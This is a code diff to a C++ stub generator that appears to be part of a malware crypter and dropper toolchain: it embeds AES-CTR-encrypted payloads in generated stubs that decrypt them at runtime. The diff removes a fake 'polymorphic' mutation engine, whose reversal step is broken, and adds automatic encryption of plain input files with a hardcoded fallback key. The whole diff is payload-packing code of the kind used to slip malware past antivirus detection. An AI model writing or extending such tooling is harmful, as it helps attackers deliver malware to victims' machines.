@@ -274,34 +274,7 @@ private:
 {KEY_DEFINITION}
 {NONCE_DEFINITION}
 
-// Polymorphic code mutation
-class PolymorphicEngine {
-private:
-    std::mt19937 rng;
-    std::uniform_int_distribution<int> dist;
-    
-public:
-    PolymorphicEngine() : rng(std::time(nullptr)), dist(0, 255) {}
-    
-    uint8_t mutateByte(uint8_t input) {
-        // Simple polymorphic transformation
-        uint8_t mutation = dist(rng);
-        return input ^ mutation;
-    }
-    
-    void mutateArray(uint8_t* data, size_t size) {
-        for (size_t i = 0; i < size; i++) {
-            data[i] = mutateByte(data[i]);
-        }
-    }
-    
-    void demutateArray(uint8_t* data, size_t size) {
-        // Reverse the mutation
-        for (size_t i = 0; i < size; i++) {
-            data[i] = mutateByte(data[i]);
-        }
-    }
-};
+
 
 // AES-128-CTR implementation (same as native_encryptor/dropper)
 static const uint8_t sbox[256] = {
@@ -494,9 +467,6 @@ void hexToBytes(const std::string& hex, uint8_t* bytes) {
 }
 
 int main() {
-    // Initialize polymorphic engine
-    PolymorphicEngine polyEngine;
-    
     // Embedded encrypted data
     uint8_t encryptedData[] = {EMBEDDED_DATA};
     size_t dataSize = sizeof(encryptedData);
@@ -505,14 +475,6 @@ int main() {
     uint8_t key[16], nonce[16];
     hexToBytes({KEY_VAR}, key);
     hexToBytes({NONCE_VAR}, nonce);
-    
-    // Apply polymorphic mutation to key and nonce
-    polyEngine.mutateArray(key, 16);
-    polyEngine.mutateArray(nonce, 16);
-    
-    // Demutate before use
-    polyEngine.demutateArray(key, 16);
-    polyEngine.demutateArray(nonce, 16);
     
     // Decrypt the data using AES-128-CTR
     aesCtrCrypt(encryptedData, encryptedData, dataSize, key, nonce);
@@ -766,6 +728,89 @@ int main() {
         ss << "}";
         return ss.str();
     }
+    
+    bool isFileEncrypted(const std::string& filename) {
+        std::ifstream file(filename, std::ios::binary);
+        if (!file.is_open()) return false;
+        
+        // Check if file is at least 16 bytes (nonce size)
+        file.seekg(0, std::ios::end);
+        size_t fileSize = file.tellg();
+        if (fileSize < 16) return false;
+        
+        // Read first 16 bytes and check if they look like a nonce
+        file.seekg(0, std::ios::beg);
+        uint8_t buffer[16];
+        if (!file.read(reinterpret_cast<char*>(buffer), 16)) return false;
+        
+        // Better heuristic: check if the first 16 bytes look like random data
+        // Plain text files typically have readable ASCII characters
+        // Encrypted files have more random-looking byte patterns
+        int printableCount = 0;
+        for (int i = 0; i < 16; i++) {
+            if (buffer[i] >= 32 && buffer[i] <= 126) { // Printable ASCII
+                printableCount++;
+            }
+        }
+        
+        // If more than 12 out of 16 bytes are printable ASCII, it's likely plain text
+        // If fewer than 8 are printable, it's likely encrypted
+        return printableCount < 8;
+    }
+    
+    std::vector<uint8_t> encryptFile(const std::string& filename) {
+        // Read the plain file
+        std::ifstream inFile(filename, std::ios::binary);
+        if (!inFile.is_open()) {
+            throw std::runtime_error("Cannot open input file: " + filename);
+        }
+        
+        std::vector<uint8_t> fileData((std::istreambuf_iterator<char>(inFile)),
+                                    std::istreambuf_iterator<char>());
+        inFile.close();
+        
+        if (fileData.empty()) {
+            throw std::runtime_error("Input file is empty");
+        }
+        
+        // Generate nonce
+        uint8_t nonce[16];
+        for (int i = 0; i < 16; i++) {
+            nonce[i] = simpleRand() & 0xFF;
+        }
+        
+        // Use the same key system as encryptor/dropper
+        uint8_t encKey[] = { 0x39,0x39,0x08,0x0F,0x0F,0x38,0x08,0x31,0x38,0x32,0x38 };
+        constexpr size_t keyLen = sizeof(encKey);
+        
+        uint8_t key[keyLen];
+        const char* envKey = std::getenv("ENCRYPTION_KEY");
+        if (envKey && strlen(envKey) >= keyLen) {
+            for (size_t i = 0; i < keyLen; ++i) {
+                key[i] = static_cast<uint8_t>(envKey[i]);
+            }
+        } else {
+            for (size_t i = 0; i < keyLen; ++i) {
+                key[i] = encKey[i];
+            }
+        }
+        
+        // Prepare AES key (expand or truncate to 16 bytes)
+        uint8_t aesKey[16];
+        for (size_t i = 0; i < 16; ++i) {
+            aesKey[i] = key[i % keyLen];
+        }
+        
+        // Encrypt the data
+        aesCtrCrypt(fileData.data(), fileData.size(), aesKey, nonce);
+        
+        // Combine nonce + encrypted data
+        std::vector<uint8_t> result;
+        result.insert(result.end(), nonce, nonce + 16);
+        result.insert(result.end(), fileData.begin(), fileData.end());
+        
+        return result;
+    }
 
 public:
     NativeStubGenerator() : rng(std::time(nullptr)) {}
@@ -773,28 +818,52 @@ public:
     void generateStub(const std::string& inputFile, const std::string& outputFile, 
                      const std::string& stubType = "basic", bool useRandomKey = true) {
         
-        // Read input file (already encrypted by native_encryptor)
-        std::ifstream inFile(inputFile, std::ios::binary);
-        if (!inFile.is_open()) {
-            std::cerr << "Error: Cannot open input file: " << inputFile << std::endl;
-            return;
-        }
-        
-        // Read the nonce from the beginning of the encrypted file
+        std::vector<uint8_t> encryptedData;
         uint8_t nonce[16];
-        if (!inFile.read(reinterpret_cast<char*>(nonce), 16)) {
-            std::cerr << "Error: Cannot read nonce from encrypted file" << std::endl;
-            return;
-        }
         
-        // Read the encrypted data
-        std::vector<uint8_t> encryptedData((std::istreambuf_iterator<char>(inFile)),
-                                         std::istreambuf_iterator<char>());
-        inFile.close();
-        
-        if (encryptedData.empty()) {
-            std::cerr << "Error: No encrypted data found" << std::endl;
-            return;
+        // Check if file is already encrypted
+        if (isFileEncrypted(inputFile)) {
+            std::cout << "✓ File appears to be already encrypted, using as-is..." << std::endl;
+            
+            // Read input file (already encrypted)
+            std::ifstream inFile(inputFile, std::ios::binary);
+            if (!inFile.is_open()) {
+                std::cerr << "Error: Cannot open input file: " << inputFile << std::endl;
+                return;
+            }
+            
+            // Read the nonce from the beginning of the encrypted file
+            if (!inFile.read(reinterpret_cast<char*>(nonce), 16)) {
+                std::cerr << "Error: Cannot read nonce from encrypted file" << std::endl;
+                return;
+            }
+            
+            // Read the encrypted data
+            encryptedData = std::vector<uint8_t>((std::istreambuf_iterator<char>(inFile)),
+                                               std::istreambuf_iterator<char>());
+            inFile.close();
+            
+            if (encryptedData.empty()) {
+                std::cerr << "Error: No encrypted data found" << std::endl;
+                return;
+            }
+        } else {
+            std::cout << "✓ File appears to be plain, encrypting first..." << std::endl;
+            
+            try {
+                // Encrypt the plain file
+                encryptedData = encryptFile(inputFile);
+                
+                // Extract nonce from the beginning
+                std::copy(encryptedData.begin(), encryptedData.begin() + 16, nonce);
+                
+                // Remove nonce from encrypted data (stub will handle it separately)
+                encryptedData.erase(encryptedData.begin(), encryptedData.begin() + 16);
+                
+            } catch (const std::exception& e) {
+                std::cerr << "Error encrypting file: " << e.what() << std::endl;
+                return;
+            }
         }
         
         // Use the same key system as encryptor/dropper (no obfuscation)
